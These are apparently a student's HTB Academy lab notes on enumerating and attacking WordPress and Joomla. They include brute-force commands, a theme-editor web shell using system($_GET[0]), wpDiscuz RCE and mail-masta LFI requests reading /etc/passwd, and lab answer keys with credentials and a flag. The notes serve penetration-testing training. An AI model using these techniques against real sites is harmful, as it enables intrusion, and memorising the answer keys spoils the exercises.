# HTB Academy — Attacking Common Applications: Module Notes

**Status:** In progress (Sections 1–5 of 33 complete)

---

## Section 1 — Introduction

### Target Applications Covered
| Category | Applications |
|---|---|
| Web CMS | WordPress, Joomla, Drupal |
| Application Servers | Apache Tomcat |
| Automation/CI | Jenkins |
| SIEM | Splunk |
| Network Monitoring | PRTG Network Monitor |
| Ticketing | osTicket |
| Source Control | GitLab |

### Key Mindset
- Attack angle 1: **public CVEs** against known versions
- Attack angle 2: **abuse built-in functionality** (script consoles, task runners, APIs) to get RCE — often more reliable than CVEs
- These apps appear on both external and internal assessments — often the only foothold in a hardened environment
- Default creds, unpatched versions, and misconfigs are the most common wins
- Never overlook an unfamiliar app — approach every app with a critical eye

### Lab Setup
Vhosts all point to one target IP. Add to `/etc/hosts` before any section:
```
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

---

## Section 2 — Application Discovery & Enumeration

### Workflow
1. Nmap scan of common web ports → save as XML
2. Feed XML into EyeWitness and/or Aquatone → screenshot reports
3. Review report (High Value Targets section first), note interesting hosts
4. Run deeper Nmap scan (`-sV`, top 10k ports) while reviewing screenshot report
5. Manual validation of everything interesting

### Nmap Initial Web Sweep
```
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### EyeWitness
```
sudo apt install eyewitness -y
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness --no-prompt
```
- Creates `ew.db` SQLite file in output folder
- Fingerprints apps and suggests default credentials
- Can also take Nessus XML

### Aquatone
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
cat web_discovery.xml | ./aquatone -nmap
```
- Output report: `aquatone_report.html`
- Title page header: **"Pages by Similarity"**
- Also takes Masscan XML

### What to Look For in Reports
- **Tomcat** → try default creds on `/manager` and `/host-manager` → upload malicious WAR → RCE
- **CMS (WordPress/Joomla/Drupal)** → check version, plugins/themes for CVEs
- **Dev subdomains** (anything with `dev` in FQDN) → may have debug mode, untested features
- **GitLab** → check for public repos, open registration, old commits with creds
- **osTicket** → sensitive ticket data, possible email registration abuse
- **Printers** → sometimes leak LDAP creds in cleartext
- File upload pages with no validation → immediate web shell opportunity

### Nmap Service Scan (deeper)
```
sudo nmap --open -sV <target_ip>
```

---

## Section 3 — WordPress: Discovery & Enumeration

### WordPress Quick Fingerprinting
```
curl -s http://<target>/ | grep WordPress
curl -s http://<target>/robots.txt
```
- `/wp-admin/` and `/wp-content/` in robots.txt = WordPress confirmed
- Meta generator tag reveals version: `<meta name="generator" content="WordPress 5.8" />`

### Manual Plugin/Theme Enumeration
```
curl -s http://<target>/ | grep plugins
curl -s http://<target>/ | grep themes
```
**Critical:** Homepage only loads plugins active on the homepage. Check individual posts too:
```
curl -s "http://<target>/?p=1" | grep plugins
curl -s "http://<target>/?p=2" | grep plugins
```
Plugins found via footer credit links (e.g., `Powered by "WP Sitemap Page"`) — not in asset references.

### Directory Enumeration (when listing is enabled)
```
curl -s http://<target>/wp-content/uploads/
curl -s http://<target>/wp-content/plugins/
curl -s http://<target>/wp-content/themes/
```
Traverse upload subdirectories manually — flag/sensitive files can be nested under year/month:
```
curl -s http://<target>/wp-content/uploads/2021/08/
```

### Plugin Version Fingerprinting
```
curl -s http://<target>/wp-content/plugins/<plugin>/readme.txt | grep -i "stable tag\|version"
```

### User Enumeration
- Valid username + wrong password → `"The password for username X is incorrect"`
- Invalid username → `"The username X is not registered on this site"`
- WordPress is vulnerable to user enumeration by default

### WPScan Automated Enumeration
```
sudo wpscan --url http://<target> --enumerate --api-token <token>
```
- Enumerates vulnerable plugins, themes, users, media, backups
- `--enumerate ap` for all plugins (not just vulnerable ones)
- Default threads: 5 (change with `-t`)
- Requires WPVulnDB API token for vulnerability data (25 free requests/day)

**WPScan limitations:**
- Misses plugins not referenced on the homepage (passive detection only)
- Manual grep of individual post pages catches what WPScan misses
- Always combine automated + manual enumeration

### WordPress User Roles
| Role | Access |
|---|---|
| Administrator | Full access, can edit source code → RCE |
| Editor | Publish/manage all posts |
| Author | Manage own posts |
| Contributor | Write own posts (no publish) |
| Subscriber | Browse posts only |

Admin access = code execution via theme editor or plugin upload.

### WordPress Attack Surface Summary
- 54% of known WP vulns are in **plugins**
- 31.5% in **WordPress core**
- 14.5% in **themes**
- XML-RPC (`/xmlrpc.php`) enabled → password brute-force via WPScan or Metasploit
- Directory listing on uploads → sensitive file exposure

### Notable Vulnerable Plugins (from lab)
- **mail-masta 1.0** → Unauthenticated LFI + SQL injection
- **wpDiscuz 7.0.4** → Unauthenticated RCE
- **WP Sitemap Page 1.6.4** → (check for known CVEs)
- **Contact Form 7 5.4.2** → (check for known CVEs)

---

## Section 4 — Attacking WordPress

### Login Brute Force
Use WPScan's xmlrpc method — faster than wp-login:
```
sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://<target>
```
Lab credentials found: `doug:jessica1`

### RCE via Theme Editor (requires admin access)
1. Log into `/wp-admin` → Appearance → Theme Editor
2. Select an **inactive** theme (e.g. Twenty Nineteen) → click Select
3. Click `404.php` in the file list
4. Add `system($_GET[0]);` just after the opening comment block
5. Click Update File → execute commands:
```
curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=id"
```

**Critical gotcha:** The file already opens with `<?php` on line 1. Adding `<?php system($_GET[0]); ?>` (with tags) inside it causes a 500 syntax error. Use bare `system($_GET[0]);` only — no opening/closing PHP tags.

**Space gotcha:** Use `%20` not `+` in query strings for system commands passed via curl.

**Flag location gotcha:** The "webroot" flag is NOT in wp-content/uploads — it's a uniquely named file directly in the WordPress install root. Always `ls` the webroot first:
```
curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=ls%20/var/www/<vhost>/"
```

### wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)
File upload bypass — MIME type detection bypassed to upload PHP webshell:
```
python3 wp_discuz.py -u http://<target> -p /?p=1
```
Script may fail at execution step — use curl directly against the uploaded file:
```
curl -s "http://<target>/wp-content/uploads/<year>/<month>/<filename>.php?cmd=id"
```

### mail-masta 1.0 — Unauthenticated LFI
Direct file inclusion via `pl` parameter, no validation:
```
curl -s "http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

---

## Section 5 — Joomla: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>/administrator/manifests/files/joomla.xml | grep "<version>"
curl -s http://<target>/README.txt | head -n 5
```

### Automated Enumeration
```
droopescan scan joomla --url http://<target>/
```
Install via: `sudo pip3 install droopescan`

### Login Brute Force
Download: `sudo wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py`
```
sudo python3 joomla-brute.py -u http://<target> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Key Paths
- Admin login: `/administrator/index.php`
- Version info: `/administrator/manifests/files/joomla.xml`
- Version approx: `/plugins/system/cache/cache.xml`
- Robots.txt reveals structure: `/administrator/`, `/components/`, `/plugins/`, etc.

### Lab Answers (app.inlanefreight.local)
- Q1 version: `3.10.0`
- Q2 password: `turnkey`

---

### Lab Answers
- Q1 user: `doug`
- Q2 password: `jessica1`
- Q3 bash user: `webadmin`
- Q4 flag: `l00k_ma_unAuth_rc3!` (at `/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt`)
